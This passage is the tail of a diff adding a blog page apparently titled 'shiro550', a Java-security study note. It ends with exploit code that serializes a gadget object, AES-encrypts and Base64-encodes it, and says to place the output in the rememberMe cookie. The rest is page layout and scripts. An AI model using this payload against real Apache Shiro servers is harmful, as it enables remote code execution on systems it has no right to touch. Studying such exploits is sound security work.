class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos);<br>        oos.writeObject(ht);<br><br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">encrypted</span> <span class="hljs-operator">=</span> cipherService.encrypt(bos.getBytes(), key);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64en</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BASE64Encoder</span>().encode(encrypted.getBytes());<br>        base64en = base64en.replace(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        base64en = base64en.replace(<span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;ser.txt&quot;</span>);<br>        <span class="hljs-type">StringReader</span> <span class="hljs-variable">sr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(base64en);<br><br>        fos.write(base64en);<br>        fos.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最后将ser.txt 输出内容替换成remenberme</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AE%89%E5%85%A8/">#java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>shiro550</div>
+      <div>https://tsy244.github.io/2025/10/10/java安全/shiro550/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 10, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/10/java%E5%AE%89%E5%85%A8/cb1/" title="cb1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">cb1</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/10/java%E5%AE%89%E5%85%A8/cc%E6%80%BB%E7%BB%93/" title="cc总结">
+                        <span class="hidden-mobile">cc总结</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
